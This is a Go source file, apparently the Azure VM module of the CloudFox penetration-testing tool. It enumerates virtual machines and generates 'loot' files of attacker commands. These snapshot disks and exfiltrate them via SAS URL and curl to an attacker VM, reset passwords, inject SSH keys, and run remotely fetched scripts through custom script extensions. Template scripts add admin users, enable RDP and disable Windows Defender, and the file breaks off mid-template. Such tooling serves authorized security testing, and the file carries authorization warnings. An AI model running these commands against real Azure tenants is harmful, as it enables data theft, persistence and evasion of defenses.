package commands

import (
	"context"
	"fmt"
	"sync"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/BishopFox/cloudfox/internal/azure/sdk"
	"github.com/spf13/cobra"
)

// ------------------------------
// Cobra command
// ------------------------------
var AzVmsCommand = &cobra.Command{
	Use:     "vms",
	Aliases: []string{"v"},
	Short:   "Enumerate Azure Virtual Machines",
	Long: `
Enumerate Azure Virtual Machines for a specific tenant:
./cloudfox az vms --tenant TENANT_ID

Enumerate Azure Virtual Machines for a specific subscription:
./cloudfox az vms --subscription SUBSCRIPTION_ID`,
	Run: ListVms,
}

// ------------------------------
// Module struct (AWS pattern with embedded BaseAzureModule)
// ------------------------------
type VmsModule struct {
	azinternal.BaseAzureModule // Embed common fields (15 fields)

	// Module-specific fields
	Subscriptions []string
	VMRows        [][]string
	LootMap       map[string]*internal.LootFile
	mu            sync.Mutex
}

// ------------------------------
// Output struct
// ------------------------------
type VmsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o VmsOutput) TableFiles() []internal.TableFile { return o.Table }
func (o VmsOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Cobra command entry point (thin wrapper)
// ------------------------------
func ListVms(cmd *cobra.Command, args []string) {
	// -------------------- Use InitializeCommandContext helper --------------------
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_VMS_MODULE_NAME)
	if err != nil {
		return // error already logged by helper
	}
	defer cmdCtx.Session.StopMonitoring()

	// -------------------- Initialize module --------------------
	module := &VmsModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 5),
		Subscriptions:   cmdCtx.Subscriptions,
		VMRows:          [][]string{},
		LootMap: map[string]*internal.LootFile{
			"vms-run-command":             {Name: "vms-run-command", Contents: ""},
			"vms-bulk-command":            {Name: "vms-bulk-command", Contents: ""},
			"vms-boot-diagnostics":        {Name: "vms-boot-diagnostics", Contents: ""},
			"vms-bastion":                 {Name: "vms-bastion", Contents: "# NOTE: Bastion host detection is best-effort.\n\n"},
			"vms-custom-script":           {Name: "vms-custom-script", Contents: ""},
			"vms-userdata":                {Name: "vms-userdata", Contents: ""},
			"vms-extension-settings":      {Name: "vms-extension-settings", Contents: ""},
			"vms-scale-sets":              {Name: "vms-scale-sets", Contents: ""},
			"vms-disk-snapshot-commands":  {Name: "vms-disk-snapshot-commands", Contents: ""},
			"vms-password-reset-commands": {Name: "vms-password-reset-commands", Contents: ""},
		},
	}

	// -------------------- Execute module --------------------
	module.PrintVms(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Main module method (AWS-style)
// ------------------------------
func (m *VmsModule) PrintVms(ctx context.Context, logger internal.Logger) {
	// Multi-tenant processing
	if m.IsMultiTenant {
		logger.InfoM(fmt.Sprintf("Multi-tenant mode: Processing %d tenants", len(m.Tenants)), globals.AZ_VMS_MODULE_NAME)

		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context for row creation
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_VMS_MODULE_NAME)
			}

			// Process subscriptions for this tenant
			m.RunSubscriptionEnumeration(ctx, logger, tenantCtx.Subscriptions, globals.AZ_VMS_MODULE_NAME, m.processSubscription)

			// Restore tenant context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
		}
	} else {
		// Single tenant processing (existing logic)
		logger.InfoM(fmt.Sprintf("Enumerating VMs for %d subscription(s)", len(m.Subscriptions)), globals.AZ_VMS_MODULE_NAME)
		m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_VMS_MODULE_NAME, m.processSubscription)
	}

	// Generate disk snapshot commands
	m.generateDiskSnapshotLoot()

	// Generate password reset commands
	m.generatePasswordResetLoot()

	// Generate and write output
	m.writeOutput(ctx, logger)
}

// ------------------------------
// Process single subscription
// ------------------------------
func (m *VmsModule) processSubscription(ctx context.Context, subID string, logger internal.Logger) {
	// Get resource groups (CACHED)
	resourceGroups := m.ResolveResourceGroups(subID)

	// Process resource groups concurrently for better performance
	var rgWg sync.WaitGroup
	rgSemaphore := make(chan struct{}, 10) // Limit to 10 concurrent RGs

	for _, rgName := range resourceGroups {
		if rgName == "" {
			continue
		}
		rgWg.Add(1)
		go m.processResourceGroup(ctx, subID, rgName, &rgWg, rgSemaphore)
	}

	rgWg.Wait()

	// Enumerate VM extensions for all VMs in this subscription
	azinternal.GetVMExtensionsForSubscription(m.Session, subID, resourceGroups, m.LootMap)

	// Enumerate Bastion shareable links for this subscription
	azinternal.GetBastionShareableLinks(m.Session, subID, m.LootMap)

	// Enumerate VM Scale Sets for this subscription
	vmssInstances, err := azinternal.GetVMScaleSetsForSubscription(m.Session, subID, resourceGroups)
	if err == nil && len(vmssInstances) > 0 {
		m.mu.Lock()
		// Add VMSS instances to VM table
		for _, vmss := range vmssInstances {
			m.VMRows = append(m.VMRows, []string{
				m.TenantName, // NEW: for multi-tenant support
				m.TenantID,   // NEW: for multi-tenant support
				vmss.SubscriptionID,
				vmss.SubscriptionName,
				vmss.ResourceGroup,
				vmss.Region,
				fmt.Sprintf("%s (VMSS Instance %s)", vmss.ScaleSetName, vmss.InstanceID),
				"N/A", // VM Size (VMSS)
				"N/A", // Tags (VMSS)
				vmss.PrivateIP,
				"N/A", // Public IPs
				vmss.ComputerName,
				vmss.AdminUsername,
				"N/A", // VNet Name
				"N/A", // Subnet
				"No",  // Is Bastion Host
				"N/A", // EntraID Centralized Auth
				"N/A", // Disk Encryption (VMSS)
				"N/A", // Endpoint Protection (VMSS)
				"N/A", // System Assigned Identity ID
				"N/A", // User Assigned Identity ID
			})
		}

		// Generate VMSS loot commands
		if loot, ok := m.LootMap["vms-scale-sets"]; ok {
			loot.Contents += "# VM Scale Set Instances\n\n"
			for _, vmss := range vmssInstances {
				loot.Contents += fmt.Sprintf("## Scale Set: %s, Instance: %s\n", vmss.ScaleSetName, vmss.InstanceID)
				loot.Contents += fmt.Sprintf("# List all instances in scale set\n")
				loot.Contents += fmt.Sprintf("az vmss list-instances --name %s --resource-group %s --subscription %s -o table\n", vmss.ScaleSetName, vmss.ResourceGroup, vmss.SubscriptionID)
				loot.Contents += fmt.Sprintf("# Get instance details\n")
				loot.Contents += fmt.Sprintf("az vmss get-instance-view --name %s --resource-group %s --instance-id %s --subscription %s\n", vmss.ScaleSetName, vmss.ResourceGroup, vmss.InstanceID, vmss.SubscriptionID)
				loot.Contents += fmt.Sprintf("# Run command on instance\n")
				loot.Contents += fmt.Sprintf("az vmss run-command invoke --name %s --resource-group %s --instance-id %s --command-id RunShellScript --scripts 'whoami' --subscription %s\n", vmss.ScaleSetName, vmss.ResourceGroup, vmss.InstanceID, vmss.SubscriptionID)
				loot.Contents += fmt.Sprintf("## PowerShell equivalents\n")
				loot.Contents += fmt.Sprintf("Get-AzVmss -ResourceGroupName %s -VMScaleSetName %s\n", vmss.ResourceGroup, vmss.ScaleSetName)
				loot.Contents += fmt.Sprintf("Get-AzVmssVM -ResourceGroupName %s -VMScaleSetName %s -InstanceId %s\n\n", vmss.ResourceGroup, vmss.ScaleSetName, vmss.InstanceID)
			}
		}
		m.mu.Unlock()
	}
}

// ------------------------------
// Process single resource group (extracted for RG-level concurrency)
// ------------------------------
func (m *VmsModule) processResourceGroup(ctx context.Context, subID, rgName string, wg *sync.WaitGroup, semaphore chan struct{}) {
	defer wg.Done()

	// Acquire semaphore
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	// Get VMs (CACHED) - using the complex function signature
	vmsBody, userData := sdk.CachedGetVMsPerResourceGroupObject(m.Session, subID, rgName, m.LootMap, m.TenantName, m.TenantID)

	// Thread-safe append of VM rows
	m.mu.Lock()
	m.VMRows = append(m.VMRows, vmsBody...)
	m.mu.Unlock()

	// Thread-safe append of userdata
	if userData != "" {
		m.mu.Lock()
		m.LootMap["vms-userdata"].Contents += userData
		m.mu.Unlock()
	}
}

// ------------------------------
// Write output (AWS-style writeLoot pattern)
// ------------------------------
func (m *VmsModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if len(m.VMRows) == 0 {
		logger.InfoM("No VMs found", globals.AZ_VMS_MODULE_NAME)
		return
	}

	// Build headers
	headers := []string{
		"Tenant Name", // NEW: for multi-tenant support
		"Tenant ID",   // NEW: for multi-tenant support
		"Subscription ID",
		"Subscription Name",
		"Resource Group",
		"Region",
		"Resource Name",
		"VM Size",
		"Tags",
		"Private IPs",
		"Public IPs",
		"Hostname",
		"Admin Username",
		"VNet Name",
		"Subnet",
		"Is Bastion Host",
		"EntraID Centralized Auth",
		"Disk Encryption",
		"Endpoint Protection",
		"System Assigned Identity ID",
		"User Assigned Identity ID",
	}

	// Check if we should split output by tenant (multi-tenant mode)
	if azinternal.ShouldSplitByTenant(m.IsMultiTenant, m.Tenants) {
		// Split into separate tenant directories
		if err := m.FilterAndWritePerTenantAuto(
			ctx,
			logger,
			m.Tenants,
			m.VMRows,
			headers,
			"vms",
			globals.AZ_VMS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Check if we should split output by subscription (multiple subs WITHOUT --tenant flag, single tenant)
	if azinternal.ShouldSplitBySubscription(m.Subscriptions, m.TenantFlagPresent) {
		if err := m.FilterAndWritePerSubscriptionAuto(
			ctx, logger, m.Subscriptions, m.VMRows, headers,
			"vms", globals.AZ_VMS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Build loot array (only non-empty loot files)
	loot := []internal.LootFile{}
	for _, lf := range m.LootMap {
		if lf.Contents != "" {
			loot = append(loot, *lf)
		}
	}

	// Create output
	output := VmsOutput{
		Table: []internal.TableFile{{
			Name:   "vms",
			Header: headers,
			Body:   m.VMRows,
		}},
		Loot: loot,
	}

	// Determine output scope (single subscription vs tenant-wide consolidation)
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Write output using HandleOutputSmart (automatic streaming for large datasets)
	if err := internal.HandleOutputSmart(
		"Azure",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIDs,
		scopeNames,
		m.UserUPN,
		output,
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_VMS_MODULE_NAME)
		m.CommandCounter.Error++
	}

	logger.SuccessM(fmt.Sprintf("Found %d VM(s) across %d subscription(s)", len(m.VMRows), len(m.Subscriptions)), globals.AZ_VMS_MODULE_NAME)
}

// ------------------------------
// Generate disk snapshot & access commands
// ------------------------------
func (m *VmsModule) generateDiskSnapshotLoot() {
	// Extract unique VMs (exclude VMSS instances)
	type VMInfo struct {
		SubscriptionID, SubscriptionName, ResourceGroup, Region, VMName string
	}

	uniqueVMs := make(map[string]VMInfo)

	for _, row := range m.VMRows {
		if len(row) < 7 {
			continue
		}

		// Column indices shifted by +2 due to tenant columns
		subID := row[2]
		subName := row[3]
		rgName := row[4]
		region := row[5]
		vmName := row[6]

		// Skip VMSS instances (they have "(VMSS Instance" in the name)
		if len(vmName) > 0 && (vmName[len(vmName)-1:] == ")" || len(vmName) > 14 && vmName[len(vmName)-14:len(vmName)-1] == "VMSS Instance") {
			continue
		}

		key := subID + "/" + rgName + "/" + vmName
		uniqueVMs[key] = VMInfo{
			SubscriptionID:   subID,
			SubscriptionName: subName,
			ResourceGroup:    rgName,
			Region:           region,
			VMName:           vmName,
		}
	}

	if len(uniqueVMs) == 0 {
		return
	}

	lf := m.LootMap["vms-disk-snapshot-commands"]
	lf.Contents += "# VM Disk Snapshot & Access Commands\n"
	lf.Contents += "# SECURITY NOTE: Disk snapshots contain complete filesystem data including:\n"
	lf.Contents += "#   - Operating system files and configurations\n"
	lf.Contents += "#   - Application data and databases\n"
	lf.Contents += "#   - User files and credentials\n"
	lf.Contents += "#   - Deleted files (until overwritten)\n"
	lf.Contents += "# This is one of the most complete data exfiltration methods available.\n\n"

	for _, vm := range uniqueVMs {
		lf.Contents += fmt.Sprintf("## VM: %s (Subscription: %s, RG: %s)\n", vm.VMName, vm.SubscriptionID, vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("# Set subscription context\n")
		lf.Contents += fmt.Sprintf("az account set --subscription %s\n\n", vm.SubscriptionID)

		// Get VM details to find disk IDs
		lf.Contents += fmt.Sprintf("# Step 1: Get VM details to identify disk IDs\n")
		lf.Contents += fmt.Sprintf("az vm show --resource-group %s --name %s --query 'storageProfile' -o json\n\n", vm.ResourceGroup, vm.VMName)

		// Create snapshot of OS disk
		lf.Contents += fmt.Sprintf("# Step 2: Create snapshot of OS disk\n")
		lf.Contents += fmt.Sprintf("OS_DISK_ID=$(az vm show --resource-group %s --name %s --query 'storageProfile.osDisk.managedDisk.id' -o tsv)\n", vm.ResourceGroup, vm.VMName)
		lf.Contents += fmt.Sprintf("az snapshot create \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s-os-snapshot \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --source \"$OS_DISK_ID\" \\\n")
		lf.Contents += fmt.Sprintf("  --location %s\n\n", vm.Region)

		// Create snapshots of data disks
		lf.Contents += fmt.Sprintf("# Step 3: Create snapshots of all data disks\n")
		lf.Contents += fmt.Sprintf("DATA_DISK_IDS=$(az vm show --resource-group %s --name %s --query 'storageProfile.dataDisks[].managedDisk.id' -o tsv)\n", vm.ResourceGroup, vm.VMName)
		lf.Contents += fmt.Sprintf("DISK_INDEX=0\n")
		lf.Contents += fmt.Sprintf("for DATA_DISK_ID in $DATA_DISK_IDS; do\n")
		lf.Contents += fmt.Sprintf("  az snapshot create \\\n")
		lf.Contents += fmt.Sprintf("    --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("    --name %s-data-snapshot-$DISK_INDEX \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("    --source \"$DATA_DISK_ID\" \\\n")
		lf.Contents += fmt.Sprintf("    --location %s\n", vm.Region)
		lf.Contents += fmt.Sprintf("  DISK_INDEX=$((DISK_INDEX + 1))\n")
		lf.Contents += fmt.Sprintf("done\n\n")

		// Generate SAS URL for OS disk snapshot
		lf.Contents += fmt.Sprintf("# Step 4: Generate SAS URL for OS disk snapshot (valid 24 hours)\n")
		lf.Contents += fmt.Sprintf("az snapshot grant-access \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s-os-snapshot \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --duration-in-seconds 86400\n\n")

		// Download snapshot
		lf.Contents += fmt.Sprintf("# Step 5: Download snapshot using the SAS URL\n")
		lf.Contents += fmt.Sprintf("# (Replace <SAS-URL> with the URL from previous command)\n")
		lf.Contents += fmt.Sprintf("curl -L \"<SAS-URL>\" -o %s-os-disk.vhd\n\n", vm.VMName)

		// Mount to attacker VM
		lf.Contents += fmt.Sprintf("# Step 6: Mount snapshot to attacker-controlled VM for analysis\n")
		lf.Contents += fmt.Sprintf("# Option A: Create disk from snapshot and attach to attacker VM\n")
		lf.Contents += fmt.Sprintf("az disk create \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group <ATTACKER-RG> \\\n")
		lf.Contents += fmt.Sprintf("  --name %s-analysis-disk \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --source /subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/snapshots/%s-os-snapshot\n\n", vm.SubscriptionID, vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("az vm disk attach \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group <ATTACKER-RG> \\\n")
		lf.Contents += fmt.Sprintf("  --vm-name <ATTACKER-VM> \\\n")
		lf.Contents += fmt.Sprintf("  --name %s-analysis-disk\n\n", vm.VMName)

		lf.Contents += fmt.Sprintf("# Option B: Create new VM from snapshot (full VM clone)\n")
		lf.Contents += fmt.Sprintf("az vm create \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group <ATTACKER-RG> \\\n")
		lf.Contents += fmt.Sprintf("  --name %s-clone \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --attach-os-disk /subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/snapshots/%s-os-snapshot \\\n", vm.SubscriptionID, vm.ResourceGroup, vm.VMName)
		lf.Contents += fmt.Sprintf("  --os-type Linux  # or Windows\n\n")

		// Linux mount commands
		lf.Contents += fmt.Sprintf("# Step 7: On Linux attacker VM, mount the attached disk\n")
		lf.Contents += fmt.Sprintf("# List available disks\n")
		lf.Contents += fmt.Sprintf("lsblk\n")
		lf.Contents += fmt.Sprintf("# Mount (assuming disk is /dev/sdc1)\n")
		lf.Contents += fmt.Sprintf("sudo mkdir -p /mnt/%s\n", vm.VMName)
		lf.Contents += fmt.Sprintf("sudo mount /dev/sdc1 /mnt/%s\n", vm.VMName)
		lf.Contents += fmt.Sprintf("# Browse filesystem\n")
		lf.Contents += fmt.Sprintf("ls -la /mnt/%s/\n\n", vm.VMName)

		// Revoke access
		lf.Contents += fmt.Sprintf("# Step 8: Revoke SAS access (cleanup)\n")
		lf.Contents += fmt.Sprintf("az snapshot revoke-access \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s-os-snapshot\n\n", vm.VMName)

		// Delete snapshot
		lf.Contents += fmt.Sprintf("# Step 9: Delete snapshot (cleanup)\n")
		lf.Contents += fmt.Sprintf("az snapshot delete \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s-os-snapshot\n\n", vm.VMName)

		// PowerShell equivalents
		lf.Contents += fmt.Sprintf("## PowerShell Equivalents\n")
		lf.Contents += fmt.Sprintf("Set-AzContext -SubscriptionId %s\n\n", vm.SubscriptionID)

		lf.Contents += fmt.Sprintf("# Get VM details\n")
		lf.Contents += fmt.Sprintf("$vm = Get-AzVM -ResourceGroupName %s -Name %s\n", vm.ResourceGroup, vm.VMName)
		lf.Contents += fmt.Sprintf("$vm.StorageProfile\n\n")

		lf.Contents += fmt.Sprintf("# Create OS disk snapshot\n")
		lf.Contents += fmt.Sprintf("$snapshotConfig = New-AzSnapshotConfig -SourceUri $vm.StorageProfile.OsDisk.ManagedDisk.Id -Location %s -CreateOption Copy\n", vm.Region)
		lf.Contents += fmt.Sprintf("New-AzSnapshot -ResourceGroupName %s -SnapshotName '%s-os-snapshot' -Snapshot $snapshotConfig\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("# Grant SAS access\n")
		lf.Contents += fmt.Sprintf("Grant-AzSnapshotAccess -ResourceGroupName %s -SnapshotName '%s-os-snapshot' -DurationInSecond 86400 -Access Read\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("# Revoke access\n")
		lf.Contents += fmt.Sprintf("Revoke-AzSnapshotAccess -ResourceGroupName %s -SnapshotName '%s-os-snapshot'\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("# Delete snapshot\n")
		lf.Contents += fmt.Sprintf("Remove-AzSnapshot -ResourceGroupName %s -SnapshotName '%s-os-snapshot' -Force\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("---\n\n")
	}
}

// ------------------------------
// Generate password reset & backdoor extension commands
// ------------------------------
func (m *VmsModule) generatePasswordResetLoot() {
	// Extract unique VMs (exclude VMSS instances)
	type VMInfo struct {
		SubscriptionID, SubscriptionName, ResourceGroup, Region, VMName string
	}

	uniqueVMs := make(map[string]VMInfo)

	for _, row := range m.VMRows {
		if len(row) < 7 {
			continue
		}

		// Column indices shifted by +2 due to tenant columns
		subID := row[2]
		subName := row[3]
		rgName := row[4]
		region := row[5]
		vmName := row[6]

		// Skip VMSS instances
		if len(vmName) > 0 && (vmName[len(vmName)-1:] == ")" || len(vmName) > 14 && vmName[len(vmName)-14:len(vmName)-1] == "VMSS Instance") {
			continue
		}

		key := subID + "/" + rgName + "/" + vmName
		uniqueVMs[key] = VMInfo{
			SubscriptionID:   subID,
			SubscriptionName: subName,
			ResourceGroup:    rgName,
			Region:           region,
			VMName:           vmName,
		}
	}

	if len(uniqueVMs) == 0 {
		return
	}

	lf := m.LootMap["vms-password-reset-commands"]
	lf.Contents += "# VM Password Reset & Access Persistence Commands\n"
	lf.Contents += "# WARNING: These commands modify VM configurations and create persistence mechanisms.\n"
	lf.Contents += "# IMPORTANT: Only use with proper authorization for authorized security testing.\n"
	lf.Contents += "# Unauthorized access to computer systems is illegal.\n\n"

	for _, vm := range uniqueVMs {
		lf.Contents += fmt.Sprintf("## VM: %s (Subscription: %s, RG: %s)\n", vm.VMName, vm.SubscriptionID, vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("# Set subscription context\n")
		lf.Contents += fmt.Sprintf("az account set --subscription %s\n\n", vm.SubscriptionID)

		// Get VM OS type
		lf.Contents += fmt.Sprintf("# Determine VM OS type\n")
		lf.Contents += fmt.Sprintf("OS_TYPE=$(az vm get-instance-view --resource-group %s --name %s --query 'osName' -o tsv)\n", vm.ResourceGroup, vm.VMName)
		lf.Contents += fmt.Sprintf("echo \"OS Type: $OS_TYPE\"\n\n")

		// Windows password reset
		lf.Contents += fmt.Sprintf("# For Windows VMs: Reset administrator password\n")
		lf.Contents += fmt.Sprintf("az vm user update \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --username <NEW-ADMIN-USERNAME> \\\n")
		lf.Contents += fmt.Sprintf("  --password '<NEW-SECURE-PASSWORD>'\n\n")

		// Linux password reset
		lf.Contents += fmt.Sprintf("# For Linux VMs: Reset user password\n")
		lf.Contents += fmt.Sprintf("az vm user update \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --username <USERNAME> \\\n")
		lf.Contents += fmt.Sprintf("  --password '<NEW-PASSWORD>'\n\n")

		// Linux SSH key addition
		lf.Contents += fmt.Sprintf("# For Linux VMs: Add SSH public key for access\n")
		lf.Contents += fmt.Sprintf("az vm user update \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --username <USERNAME> \\\n")
		lf.Contents += fmt.Sprintf("  --ssh-key-value \"$(cat ~/.ssh/id_rsa.pub)\"\n\n")

		// Delete existing user (cleanup of evidence)
		lf.Contents += fmt.Sprintf("# Delete a user account (cleanup)\n")
		lf.Contents += fmt.Sprintf("az vm user delete \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --username <USERNAME-TO-DELETE>\n\n")

		// Windows custom script extension
		lf.Contents += fmt.Sprintf("# Deploy Custom Script Extension (Windows) - HIGHLY DETECTABLE\n")
		lf.Contents += fmt.Sprintf("# NOTE: Replace <SCRIPT-URL> with your script location\n")
		lf.Contents += fmt.Sprintf("# Example: https://yourstorageaccount.blob.core.windows.net/scripts/setup.ps1\n")
		lf.Contents += fmt.Sprintf("az vm extension set \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --vm-name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --name CustomScriptExtension \\\n")
		lf.Contents += fmt.Sprintf("  --publisher Microsoft.Compute \\\n")
		lf.Contents += fmt.Sprintf("  --settings '{\"fileUris\":[\"<SCRIPT-URL>\"],\"commandToExecute\":\"powershell.exe -ExecutionPolicy Unrestricted -File setup.ps1\"}'\n\n")

		// Linux custom script extension
		lf.Contents += fmt.Sprintf("# Deploy Custom Script Extension (Linux) - HIGHLY DETECTABLE\n")
		lf.Contents += fmt.Sprintf("# NOTE: Replace <SCRIPT-URL> with your script location\n")
		lf.Contents += fmt.Sprintf("az vm extension set \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --vm-name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --name CustomScript \\\n")
		lf.Contents += fmt.Sprintf("  --publisher Microsoft.Azure.Extensions \\\n")
		lf.Contents += fmt.Sprintf("  --settings '{\"fileUris\":[\"<SCRIPT-URL>\"],\"commandToExecute\":\"bash setup.sh\"}'\n\n")

		// Inline command execution
		lf.Contents += fmt.Sprintf("# Execute inline PowerShell command (Windows)\n")
		lf.Contents += fmt.Sprintf("az vm extension set \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --vm-name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --name CustomScriptExtension \\\n")
		lf.Contents += fmt.Sprintf("  --publisher Microsoft.Compute \\\n")
		lf.Contents += fmt.Sprintf("  --settings '{\"commandToExecute\":\"powershell.exe -Command <YOUR-COMMAND-HERE>\"}'\n\n")

		// List extensions
		lf.Contents += fmt.Sprintf("# List all VM extensions (reconnaissance)\n")
		lf.Contents += fmt.Sprintf("az vm extension list \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --vm-name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  -o table\n\n")

		// Delete extension (cleanup)
		lf.Contents += fmt.Sprintf("# Delete custom script extension (cleanup)\n")
		lf.Contents += fmt.Sprintf("az vm extension delete \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", vm.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --vm-name %s \\\n", vm.VMName)
		lf.Contents += fmt.Sprintf("  --name CustomScriptExtension\n\n")

		// PowerShell equivalents
		lf.Contents += fmt.Sprintf("## PowerShell Equivalents\n")
		lf.Contents += fmt.Sprintf("Set-AzContext -SubscriptionId %s\n\n", vm.SubscriptionID)

		lf.Contents += fmt.Sprintf("# Reset VM password (Windows)\n")
		lf.Contents += fmt.Sprintf("$cred = Get-Credential -UserName <USERNAME>\n")
		lf.Contents += fmt.Sprintf("Set-AzVMAccessExtension -ResourceGroupName %s -VMName %s -Name VMAccessAgent -Credential $cred\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("# Add SSH key (Linux)\n")
		lf.Contents += fmt.Sprintf("Set-AzVMAccessExtension -ResourceGroupName %s -VMName %s -Name VMAccessForLinux -UserName <USERNAME> -Ssh-Key \"$(Get-Content ~/.ssh/id_rsa.pub)\"\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("# Deploy custom script extension (Windows)\n")
		lf.Contents += fmt.Sprintf("Set-AzVMCustomScriptExtension -ResourceGroupName %s -VMName %s -Name CustomScriptExtension -FileUri '<SCRIPT-URL>' -Run 'setup.ps1'\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("# List extensions\n")
		lf.Contents += fmt.Sprintf("Get-AzVMExtension -ResourceGroupName %s -VMName %s\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("# Remove extension\n")
		lf.Contents += fmt.Sprintf("Remove-AzVMExtension -ResourceGroupName %s -VMName %s -Name CustomScriptExtension -Force\n\n", vm.ResourceGroup, vm.VMName)

		lf.Contents += fmt.Sprintf("---\n\n")
	}

	// Add examples section
	lf.Contents += "# ========================================\n"
	lf.Contents += "# EXAMPLE SCRIPT TEMPLATES\n"
	lf.Contents += "# ========================================\n\n"

	lf.Contents += "# Example Windows PowerShell script (setup.ps1):\n"
	lf.Contents += "# WARNING: This is for authorized security testing only\n"
	lf.Contents += "#\n"
	lf.Contents += "# # Enable RDP\n"
	lf.Contents += "# Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0\n"
	lf.Contents += "# Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'\n"
	lf.Contents += "#\n"
	lf.Contents += "# # Create new admin user\n"
	lf.Contents += "# net user <username> <password> /add\n"
	lf.Contents += "# net localgroup administrators <username> /add\n"
	lf.Contents += "#\n"
	lf.Contents += "# # Disable Windows Defender (if testing detection bypass)\n"
	lf.Contents += "# Set-MpPreference -DisableRealtimeMonitoring $true\n\n"

	lf.Contents += "# Example Linux bash script (setup.sh):\n"
	lf.Contents += "# WARNING: This is for authorized security testing only\n"
	lf.Contents += "#\n"
	lf.Contents += "# #!/bin/bash\n"
	lf.Contents += "# # Add SSH key for access\n"
	lf.Contents += "# mkdir -p ~/.ssh\n"
